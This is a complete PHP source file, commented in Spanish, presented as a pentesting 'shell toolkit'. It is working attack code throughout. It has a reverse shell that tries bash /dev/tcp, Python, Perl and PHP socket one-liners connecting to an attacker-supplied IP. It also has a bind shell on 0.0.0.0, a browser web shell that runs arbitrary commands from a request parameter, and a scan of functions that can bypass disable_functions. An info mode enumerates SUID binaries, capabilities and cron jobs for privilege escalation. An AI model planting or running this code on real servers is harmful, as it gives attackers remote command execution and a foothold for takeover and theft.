<?php
/**
 * PHP 8.x Advanced Shell Toolkit
 * Para uso exclusivo en pentesting autorizado
 *
 * Modos:
 *   ?mode=reverse&ip=IP&port=PORT     Reverse shell clásica
 *   ?mode=bind&port=PORT              Bind shell (escucha en el target)
 *   ?mode=web                         Web shell interactiva
 *   ?mode=info                        Enumeración del sistema
 *   ?mode=scan                        Escanea funciones disponibles
 *
 * Todos los modos soportan &debug=1
 */

set_time_limit(0);
error_reporting(0);

$config = [
    'mode'    => $_REQUEST['mode']  ?? 'web',
    'ip'      => $_REQUEST['ip']    ?? '127.0.0.1',
    'port'    => $_REQUEST['port']  ?? 4444,
    'cmd'     => $_REQUEST['cmd']   ?? '',
    'debug'   => $_REQUEST['debug'] ?? 0,
    'retries' => 3,
    'timeout' => 10,
];

$is_web = php_sapi_name() !== 'cli';

// ========== OUTPUT ==========

function setup_streaming(): void {
    global $is_web;
    if ($is_web) {
        @header('Content-Type: text/plain; charset=utf-8');
        @header('X-Accel-Buffering: no');
        @ini_set('output_buffering', 'off');
        @ini_set('zlib.output_compression', false);
        while (ob_get_level()) ob_end_flush();
        ob_implicit_flush(true);
    }
}

function out(string $msg, bool $debug_only = false): void {
    global $config, $is_web;
    if ($debug_only && !$config['debug']) return;
    if ($is_web) {
        echo $msg . "\n";
        @flush();
    } else {
        fwrite(STDERR, $msg . "\n");
    }
}

// ========== FUNCIONES DISPONIBLES ==========

function get_disabled(): array {
    return array_map('trim', explode(',', ini_get('disable_functions')));
}

function fn_available(string $fn): bool {
    return function_exists($fn) && !in_array($fn, get_disabled());
}

function check_functions(): array {
    $fns = [
        'exec', 'system', 'passthru', 'shell_exec',
        'proc_open', 'popen', 'pcntl_exec', 'pcntl_fork',
        'fsockopen', 'stream_socket_client', 'stream_socket_server',
        'socket_create', 'putenv', 'mail', 'error_log',
        'mb_send_mail', 'imap_open',
    ];
    $result = [];
    foreach ($fns as $fn) {
        $result[$fn] = fn_available($fn);
    }
    return $result;
}

// ========== EJECUTAR COMANDO (auto-detecta método) ==========

function run_bg(string $cmd): string {
    $wrapped = "nohup sh -c " . escapeshellarg($cmd) . " > /dev/null 2>&1 & echo \"PID: \$!\"";
    if (fn_available('proc_open')) {
        $desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $p = @proc_open($wrapped, $desc, $pipes);
        if (is_resource($p)) {
            $out = stream_get_contents($pipes[1]);
            fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
            return "[+] Lanzado en background: {$cmd}\n" . trim($out);
        }
    }
    if (fn_available('popen')) {
        $h = @popen($wrapped, 'r');
        if ($h) { $out = stream_get_contents($h); pclose($h); return "[+] Background: " . trim($out); }
    }
    return "[-] No se pudo lanzar en background";
}

function run_cmd(string $cmd): string {
    if (fn_available('proc_open')) {
        $desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $p = @proc_open($cmd, $desc, $pipes);
        if (is_resource($p)) {
            $out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($p);
            return $out;
        }
    }
    if (fn_available('popen')) {
        $h = @popen($cmd . ' 2>&1', 'r');
        if ($h) {
            $out = stream_get_contents($h);
            pclose($h);
            return $out;
        }
    }
    if (fn_available('exec')) {
        @exec($cmd . ' 2>&1', $out, $ret);
        return implode("\n", $out);
    }
    if (fn_available('shell_exec')) {
        return @shell_exec($cmd . ' 2>&1') ?? '';
    }
    if (fn_available('system')) {
        ob_start();
        @system($cmd . ' 2>&1');
        return ob_get_clean();
    }
    if (fn_available('passthru')) {
        ob_start();
        @passthru($cmd . ' 2>&1');
        return ob_get_clean();
    }
    return "[!] No hay funciones de ejecución disponibles";
}

// ========== DETECTAR SHELL DISPONIBLE ==========

function detect_shell(): string {
    $shells = ['/bin/bash', '/bin/sh', '/bin/dash', '/bin/zsh', '/usr/bin/bash', '/usr/bin/sh'];
    foreach ($shells as $sh) {
        if (file_exists($sh)) return $sh;
    }
    return '/bin/sh';
}

// ========== CONEXIÓN TCP ==========

function try_connect(string $ip, int $port, int $timeout): mixed {
    if (fn_available('fsockopen')) {
        out("[*] fsockopen -> {$ip}:{$port}", true);
        $s = @fsockopen($ip, $port, $en, $es, $timeout);
        if ($s) { out("[+] Conectado via fsockopen", true); return $s; }
        out("[-] fsockopen: {$es} ({$en})", true);
    }
    if (fn_available('stream_socket_client')) {
        out("[*] stream_socket_client -> {$ip}:{$port}", true);
        $s = @stream_socket_client("tcp://{$ip}:{$port}", $en, $es, $timeout);
        if ($s) { out("[+] Conectado via stream_socket_client", true); return $s; }
        out("[-] stream_socket_client: {$es} ({$en})", true);
    }
    if (fn_available('socket_create')) {
        out("[*] socket_create -> {$ip}:{$port}", true);
        $s = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($s && @socket_connect($s, $ip, $port)) {
            out("[+] Conectado via socket_create", true);
            return $s;
        }
        if ($s) socket_close($s);
        out("[-] socket_create falló", true);
    }
    return false;
}

// ========== MODO: REVERSE SHELL ==========

function mode_reverse(): void {
    global $config;
    setup_streaming();
    $ip = $config['ip'];
    $port = (int)$config['port'];

    out("=== Reverse Shell -> {$ip}:{$port} ===");

    $funcs = check_functions();
    if ($config['debug']) {
        out("\n[*] Funciones:", true);
        foreach ($funcs as $fn => $ok) out("  [" . ($ok ? '+' : '-') . "] {$fn}", true);
    }

    $tmp = sys_get_temp_dir();
    $logfile = $tmp . '/.revshell_debug.log';
    $shell = detect_shell();

    // ESTRATEGIA 1: bash /dev/tcp (no depende de PHP para TCP)
    if (fn_available('proc_open')) {
        out("[*] Estrategia 1: bash /dev/tcp directo");

        $desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];

        // Intentar /dev/tcp directo con nohup
        $cmd = "nohup {$shell} -c '{$shell} -i >& /dev/tcp/{$ip}/{$port} 0>&1' > /dev/null 2>&1 &";
        $p = @proc_open($cmd, $desc, $pipes);
        if (is_resource($p)) {
            $err = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($p);
            if ($err === '' || $err === false) {
                out("[+] Lanzado via bash /dev/tcp");
                sleep(2);
                // Verificar si conectó
                $check = @proc_open("ps aux | grep '/dev/tcp' | grep -v grep", [1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $cp);
                if (is_resource($check)) {
                    $ps = stream_get_contents($cp[1]);
                    fclose($cp[1]); fclose($cp[2]); proc_close($check);
                    if (strlen(trim($ps)) > 0) {
                        out("[+] Proceso activo confirmado");
                        return;
                    }
                }
                out("[?] Proceso lanzado pero no confirmado, verifica tu listener");
                return;
            }
            out("[-] bash /dev/tcp falló: {$err}", true);
        }
    }

    // ESTRATEGIA 2: python reverse shell via proc_open
    if (fn_available('proc_open')) {
        out("[*] Estrategia 2: python reverse shell");

        // Detectar python
        $pybin = '';
        foreach (['python3', 'python', 'python2'] as $py) {
            $desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
            $p = @proc_open("which {$py}", $desc, $pipes);
            if (is_resource($p)) {
                $path = trim(stream_get_contents($pipes[1]));
                fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
                if ($path !== '' && file_exists($path)) { $pybin = $py; break; }
            }
        }

        if ($pybin !== '') {
            out("[*] Encontrado: {$pybin}", true);
            $pycmd = "{$pybin} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{$ip}\",{$port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"{$shell}\",\"-i\"])'";
            $desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
            $p = @proc_open("nohup {$pycmd} > /dev/null 2>&1 &", $desc, $pipes);
            if (is_resource($p)) {
                fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
                out("[+] Lanzado via {$pybin}");
                return;
            }
        } else {
            out("[-] Python no encontrado", true);
        }
    }

    // ESTRATEGIA 3: perl reverse shell
    if (fn_available('proc_open')) {
        out("[*] Estrategia 3: perl reverse shell");
        $desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $p = @proc_open("which perl", $desc, $pipes);
        if (is_resource($p)) {
            $perlpath = trim(stream_get_contents($pipes[1]));
            fclose($pipes[1]); fclose($pipes[2]); proc_close($p);

            if ($perlpath !== '' && file_exists($perlpath)) {
                out("[*] Encontrado: perl", true);
                $plcmd = "perl -e 'use Socket;\$i=\"{$ip}\";\$p={$port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{$shell} -i\");};'";
                $desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
                $p = @proc_open("nohup {$plcmd} > /dev/null 2>&1 &", $desc, $pipes);
                if (is_resource($p)) {
                    fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
                    out("[+] Lanzado via perl");
                    return;
                }
            }
        }
    }

    // ESTRATEGIA 4: pcntl_fork + PHP socket (debug con log)
    if (fn_available('pcntl_fork')) {
        out("[*] Estrategia 4: pcntl_fork + PHP socket");
        $pid = pcntl_fork();
        if ($pid === -1) {
            out("[-] pcntl_fork falló");
        } elseif ($pid > 0) {
            out("[+] Hijo forkeado PID: {$pid}");
            out("[*] Debug log: {$logfile}");
            return;
        } else {
            // Hijo: log a archivo para debug
            if (function_exists('posix_setsid')) posix_setsid();

            $log = @fopen($logfile, 'w');
            $dbg = function(string $m) use ($log) {
                if ($log) { fwrite($log, date('H:i:s') . " {$m}\n"); fflush($log); }
            };

            $dbg("Hijo iniciado PID=" . getmypid());
            $dbg("Conectando a {$ip}:{$port}");

            $socket = @fsockopen($ip, $port, $en, $es, 10);
            $dbg("fsockopen resultado: " . ($socket ? "OK" : "FAIL errno={$en} err={$es}"));

            if (!$socket) {
                $socket = @stream_socket_client("tcp://{$ip}:{$port}", $en, $es, 10);
                $dbg("stream_socket_client resultado: " . ($socket ? "OK" : "FAIL errno={$en} err={$es}"));
            }

            if (!$socket) {
                $dbg("No se pudo conectar, saliendo");
                if ($log) fclose($log);
                exit(1);
            }

            $dbg("Conectado, lanzando shell");

            $desc = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
            $process = @proc_open("{$shell} -i", $desc, $pipes);
            $dbg("proc_open resultado: " . (is_resource($process) ? "OK" : "FAIL"));

            if (!is_resource($process)) {
                fclose($socket);
                if ($log) fclose($log);
                exit(1);
            }

            stream_set_blocking($pipes[1], false);
            stream_set_blocking($pipes[2], false);
            stream_set_blocking($socket, false);

            $dbg("Shell loop iniciado");
            if ($log) fclose($log);

            while (true) {
                $status = proc_get_status($process);
                if (!$status['running']) break;

                $read = [$socket, $pipes[1], $pipes[2]];
                $w = null; $e = null;
                $changed = @stream_select($read, $w, $e, 0, 100000);
                if ($changed === false) break;

                if (in_array($socket, $read)) {
                    $input = @fread($socket, 4096);
                    if ($input === false || $input === '') break;
                    @fwrite($pipes[0], $input);
                }
                if (in_array($pipes[1], $read)) {
                    $stdout = @fread($pipes[1], 4096);
                    if ($stdout !== false && $stdout !== '') @fwrite($socket, $stdout);
                }
                if (in_array($pipes[2], $read)) {
                    $stderr = @fread($pipes[2], 4096);
                    if ($stderr !== false && $stderr !== '') @fwrite($socket, $stderr);
                }
                if (feof($socket)) break;
            }

            @fclose($pipes[0]); @fclose($pipes[1]); @fclose($pipes[2]);
            @proc_close($process);
            @fclose($socket);
            exit(0);
        }
    }

    out("[-] Todas las estrategias fallaron");
}

// ========== MODO: BIND SHELL ==========

function mode_bind(): void {
    global $config;
    setup_streaming();
    $port = (int)$config['port'];
    out("=== Bind Shell en puerto {$port} ===");

    $server = false;

    // Método 1: stream_socket_server
    if (fn_available('stream_socket_server')) {
        out("[*] Usando stream_socket_server", true);
        $server = @stream_socket_server("tcp://0.0.0.0:{$port}", $en, $es);
        if ($server) {
            out("[+] Escuchando en 0.0.0.0:{$port}");
            out("[*] Conecta con: nc TARGET_IP {$port}");
            $client = @stream_socket_accept($server, -1);
            if ($client) {
                out("[+] Conexión recibida", true);
                $shell = detect_shell();
                if (fn_available('proc_open')) {
                    interactive_shell($client, $shell);
                } elseif (fn_available('popen')) {
                    popen_shell($client);
                }
                fclose($client);
            }
            fclose($server);
            return;
        }
        out("[-] stream_socket_server falló: {$es}", true);
    }

    // Método 2: socket extension
    if (fn_available('socket_create')) {
        out("[*] Usando socket_create", true);
        $server = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($server) {
            @socket_set_option($server, SOL_SOCKET, SO_REUSEADDR, 1);
            if (@socket_bind($server, '0.0.0.0', $port) && @socket_listen($server, 1)) {
                out("[+] Escuchando en 0.0.0.0:{$port}");
                out("[*] Conecta con: nc TARGET_IP {$port}");
                $client = @socket_accept($server);
                if ($client) {
                    out("[+] Conexión recibida", true);
                    // Wrap socket en stream para compatibilidad
                    $stream = socket_export_stream($client);
                    if ($stream) {
                        $shell = detect_shell();
                        if (fn_available('proc_open')) {
                            interactive_shell($stream, $shell);
                        } elseif (fn_available('popen')) {
                            popen_shell($stream);
                        }
                        fclose($stream);
                    }
                }
                socket_close($server);
                return;
            }
        }
        out("[-] socket_create bind falló", true);
    }

    out("[-] No hay funciones de bind disponibles");
}

// ========== SHELL INTERACTIVA (proc_open) ==========

function interactive_shell(mixed $sock, string $shell_path): void {
    out("[*] Shell interactiva: {$shell_path} -i", true);

    $desc = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];

    $process = @proc_open("{$shell_path} -i", $desc, $pipes);
    if (!is_resource($process)) {
        // Fallback sin -i
        $process = @proc_open($shell_path, $desc, $pipes);
        if (!is_resource($process)) {
            out("[-] proc_open falló");
            return;
        }
    }

    stream_set_blocking($pipes[1], false);
    stream_set_blocking($pipes[2], false);
    stream_set_blocking($sock, false);

    while (true) {
        $status = proc_get_status($process);
        if (!$status['running']) break;

        $read = [$sock, $pipes[1], $pipes[2]];
        $w = null;
        $e = null;

        $changed = @stream_select($read, $w, $e, 0, 100000);
        if ($changed === false) break;

        if (in_array($sock, $read)) {
            $input = @fread($sock, 4096);
            if ($input === false || $input === '') break;
            @fwrite($pipes[0], $input);
        }
        if (in_array($pipes[1], $read)) {
            $stdout = @fread($pipes[1], 4096);
            if ($stdout !== false && $stdout !== '') @fwrite($sock, $stdout);
        }
        if (in_array($pipes[2], $read)) {
            $stderr = @fread($pipes[2], 4096);
            if ($stderr !== false && $stderr !== '') @fwrite($sock, $stderr);
        }

        if (feof($sock)) break;
    }

    @fclose($pipes[0]);
    @fclose($pipes[1]);
    @fclose($pipes[2]);
    @proc_close($process);
}

// ========== SHELL VIA POPEN (fallback) ==========

function popen_shell(mixed $sock): void {
    out("[*] Shell popen (comando por comando)", true);
    @fwrite($sock, "$ ");

    stream_set_blocking($sock, false);

    $buffer = '';
    while (true) {
        $input = @fread($sock, 4096);
        if ($input === false) break;

        if ($input !== '' && $input !== false) {
            $buffer .= $input;
            if (str_contains($buffer, "\n")) {
                $cmd = trim($buffer);
                $buffer = '';
                if ($cmd === 'exit' || $cmd === 'quit') break;
                if ($cmd === '') { @fwrite($sock, "$ "); continue; }

                $h = @popen($cmd . ' 2>&1', 'r');
                if ($h) {
                    while (!feof($h)) {
                        $line = fread($h, 4096);
                        if ($line !== false && $line !== '') @fwrite($sock, $line);
                    }
                    pclose($h);
                }
                @fwrite($sock, "\n$ ");
            }
        }

        if (feof($sock)) break;
        usleep(25000);
    }
}

// ========== MODO: WEB SHELL ==========

function mode_web(): void {
    global $config;
    $cmd = $config['cmd'];
    $self = $_SERVER['PHP_SELF'] ?? basename(__FILE__);

    $bg = $_REQUEST['bg'] ?? '0';
    $output = '';
    if ($cmd !== '') {
        $output = ($bg === '1') ? run_bg($cmd) : run_cmd($cmd);
    }

    // Info rápida del sistema
    $user = run_cmd('whoami 2>/dev/null') ?: (run_cmd('id 2>/dev/null') ?: 'unknown');
    $host = run_cmd('hostname 2>/dev/null') ?: php_uname('n');
    $cwd  = getcwd();

    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><html><head><meta charset="utf-8">';
    echo '<title>shell</title>';
    echo '<style>';
    echo 'body{background:#0a0a0a;color:#0f0;font-family:"Courier New",monospace;font-size:14px;margin:0;padding:20px}';
    echo 'h3{color:#0ff;margin:0 0 10px}';
    echo '.info{color:#888;margin-bottom:15px;font-size:12px}';
    echo '.info span{color:#0f0}';
    echo 'form{display:flex;gap:8px;margin-bottom:15px}';
    echo 'input[type=text]{flex:1;background:#111;color:#0f0;border:1px solid #333;padding:8px 12px;font-family:inherit;font-size:14px;outline:none}';
    echo 'input[type=text]:focus{border-color:#0f0}';
    echo 'button{background:#1a1a1a;color:#0f0;border:1px solid #333;padding:8px 16px;cursor:pointer;font-family:inherit}';
    echo 'button:hover{background:#0f0;color:#000}';
    echo 'pre{background:#111;border:1px solid #222;padding:15px;overflow-x:auto;max-height:70vh;overflow-y:auto;white-space:pre-wrap;word-wrap:break-word}';
    echo '.modes{margin-top:20px;padding-top:15px;border-top:1px solid #222;font-size:12px;color:#666}';
    echo '.modes a{color:#0ff;text-decoration:none;margin-right:15px}';
    echo '.modes a:hover{text-decoration:underline}';
    echo '</style></head><body>';

    echo '<h3>' . htmlspecialchars(trim($user)) . '@' . htmlspecialchars(trim($host)) . '</h3>';
    echo '<div class="info">cwd: <span>' . htmlspecialchars($cwd) . '</span> | ';
    echo 'php: <span>' . PHP_VERSION . '</span> | ';
    echo 'os: <span>' . PHP_OS . '</span> | ';
    echo 'sapi: <span>' . php_sapi_name() . '</span></div>';

    echo '<form method="GET" action="' . htmlspecialchars($self) . '">';
    echo '<input type="hidden" name="mode" value="web">';
    echo '<input type="text" name="cmd" value="' . htmlspecialchars($cmd) . '" placeholder="Comando..." autofocus autocomplete="off">';
    echo '<label style="color:#888;font-size:12px;display:flex;align-items:center;gap:4px"><input type="checkbox" name="bg" value="1"' . ($bg === '1' ? ' checked' : '') . '> Background</label>';
    echo '<button type="submit">Ejecutar</button>';
    echo '</form>';

    if ($cmd !== '') {
        echo '<pre>' . htmlspecialchars($output) . '</pre>';
    }

    echo '<div class="modes">';
    echo '<a href="?mode=scan">Scan funciones</a>';
    echo '<a href="?mode=info">Info sistema</a>';
    echo '<a href="?mode=web">Web shell</a>';
    echo '</div>';

    echo '</body></html>';
}

// ========== MODO: SCAN ==========

function mode_scan(): void {
    global $is_web;
    if ($is_web) header('Content-Type: text/plain; charset=utf-8');

    echo "=== PHP Function Scanner ===\n";
    echo "PHP Version: " . PHP_VERSION . "\n";
    echo "SAPI: " . php_sapi_name() . "\n";
    echo "OS: " . PHP_OS . " " . php_uname('r') . "\n";
    echo "disable_functions: " . (ini_get('disable_functions') ?: '(ninguna)') . "\n";
    echo "open_basedir: " . (ini_get('open_basedir') ?: '(sin restricción)') . "\n\n";

    $categories = [
        'Ejecución' => ['exec', 'system', 'passthru', 'shell_exec', 'proc_open', 'popen', 'pcntl_exec', 'pcntl_fork'],
        'Red (saliente)' => ['fsockopen', 'stream_socket_client', 'curl_init', 'file_get_contents'],
        'Red (bind)' => ['stream_socket_server', 'socket_create'],
        'Bypass vectors' => ['putenv', 'mail', 'error_log', 'mb_send_mail', 'imap_open'],
        'Filesystem' => ['file_put_contents', 'fopen', 'fwrite', 'mkdir', 'chmod', 'symlink', 'link'],
        'Info' => ['phpinfo', 'getmyuid', 'getmypid', 'posix_getuid', 'posix_getpwuid'],
        'FFI (PHP 7.4+)' => ['FFI::cdef'],
    ];

    foreach ($categories as $cat => $fns) {
        echo "--- {$cat} ---\n";
        foreach ($fns as $fn) {
            if (str_contains($fn, '::')) {
                $ok = class_exists(explode('::', $fn)[0]);
            } else {
                $ok = fn_available($fn);
            }
            $status = $ok ? "\033[32m+\033[0m" : "\033[31m-\033[0m";
            if ($is_web) $status = $ok ? '[+]' : '[-]';
            echo "  {$status} {$fn}\n";
        }
        echo "\n";
    }

    // Writable dirs
    echo "--- Directorios escribibles ---\n";
    $dirs = ['/tmp', '/var/tmp', '/dev/shm', sys_get_temp_dir(), getcwd()];
    foreach (array_unique($dirs) as $d) {
        $w = @is_writable($d);
        $status = $w ? '[+]' : '[-]';
        echo "  {$status} {$d}\n";
    }
    echo "\n";

    // Recomendación
    echo "--- Recomendación ---\n";
    if (fn_available('proc_open') || fn_available('popen')) {
        if (fn_available('fsockopen') || fn_available('stream_socket_client')) {
            echo "  [>] ?mode=reverse&ip=IP&port=PORT  (reverse shell)\n";
        }
        if (fn_available('stream_socket_server') || fn_available('socket_create')) {
            echo "  [>] ?mode=bind&port=PORT  (bind shell)\n";
        }
        echo "  [>] ?mode=web  (web shell)\n";
    } else {
        echo "  [>] ?mode=web  (solo web shell disponible via run_cmd fallbacks)\n";
    }
}

// ========== MODO: INFO ==========

function mode_info(): void {
    global $is_web;
    if ($is_web) header('Content-Type: text/plain; charset=utf-8');

    echo "=== System Enumeration ===\n\n";

    $commands = [
        'Usuario'       => 'id',
        'Hostname'      => 'hostname -f 2>/dev/null || hostname',
        'Kernel'        => 'uname -a',
        'Distro'        => 'cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null',
        'IP interna'    => 'ip -4 addr show 2>/dev/null || ifconfig 2>/dev/null',
        'DNS'           => 'cat /etc/resolv.conf 2>/dev/null',
        'Rutas'         => 'ip route 2>/dev/null || route -n 2>/dev/null',
        'ARP'           => 'ip neigh 2>/dev/null || arp -an 2>/dev/null',
        'Procesos'      => 'ps aux 2>/dev/null || ps -ef 2>/dev/null',
        'Conexiones'    => 'ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null',
        'Crontabs'      => 'crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null',
        'SUID binaries' => 'find / -perm -4000 -type f 2>/dev/null | head -30',
        'Capabilities'  => 'getcap -r / 2>/dev/null | head -20',
        'Writable dirs' => 'find / -writable -type d 2>/dev/null | head -20',
        'PHP config'    => 'php -i 2>/dev/null | head -50',
    ];

    foreach ($commands as $label => $cmd) {
        echo "--- {$label} ---\n";
        $result = run_cmd($cmd);
        echo ($result !== '' ? $result : '(sin resultado)') . "\n\n";
    }
}

// ========== ROUTER ==========

match ($config['mode']) {
    'reverse' => mode_reverse(),
    'bind'    => mode_bind(),
    'web'     => mode_web(),
    'scan'    => mode_scan(),
    'info'    => mode_info(),
    default   => mode_web(),
};
